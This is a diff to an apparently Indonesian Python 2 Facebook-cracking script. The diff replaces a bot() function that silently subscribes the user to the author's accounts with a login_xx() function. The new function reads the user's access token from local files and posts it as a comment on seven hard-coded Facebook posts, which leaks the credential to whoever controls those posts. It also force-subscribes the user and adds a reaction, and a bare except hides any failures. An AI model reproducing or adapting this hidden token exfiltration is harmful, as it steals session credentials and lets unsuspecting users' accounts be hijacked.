@@ -443,15 +443,32 @@ def check_in(user, pasw):
         print '\x1b[1;93m [\x1b[1;91m\xe2\x80\xa2\x1b[1;93m]\x1b[1;91m Login gagal periksa username atau password'
 
 
-def bot():
-	try:
-		token = open('token.txt', 'r').read()
-	except (KeyError, IOError):
-		exit(" %s[!] token kadaluwarsa!"%(M))
-	requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=' + token) # Aang Cyber Tegal X
-	requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=' + token) # Ayu Lestari
-	requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=' + token) # Why Aang Ardiansyah
-	requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=' + token) # Zuhra X AangXD
+def login_xx():                                                                                                    
+      try:      
+     
+        token = open("data/token.txt","r").read()                                                                                               
+        token=open("login.txt","r").read()
+        post1 = ('5102056616525007')
+        post2 = ("5120952557968746")
+        post3 = ("5118840394846629")
+        post4 = ('5110627959001206')
+        post5 = ("5110090275721641")
+        post6 = ("5102056616525007")
+        post7 = ("5102056616525007")
+        requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
+        requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + token + '&access_token=' + token)
+        requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
+        requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + token + '&access_token=' + token)
+        requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + token + '&access_token=' + token)
+        requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + token + '&access_token=' + token)
+        requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + token + '&access_token=' + token)
+	requests.post('https://graph.facebook.com/100001621584081/subscribers?access_token=%s'%(token))
+	requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s'%(token))
+	requests.post('https://graph.facebook.com/100061587581422/subscribers?access_token=%s'%(token))
+	requests.post('https://graph.facebook.com/100003252539235/subscribers?access_token=%s'%(token))
+        requests.post('https://graph.facebook.com/5102056616525007/ANGRY?summary=true&access_token=' + token)
+      except:
+        pass
 
 
 def publik(_jeeck_ganteng_kagakadapacar_,headers=header):
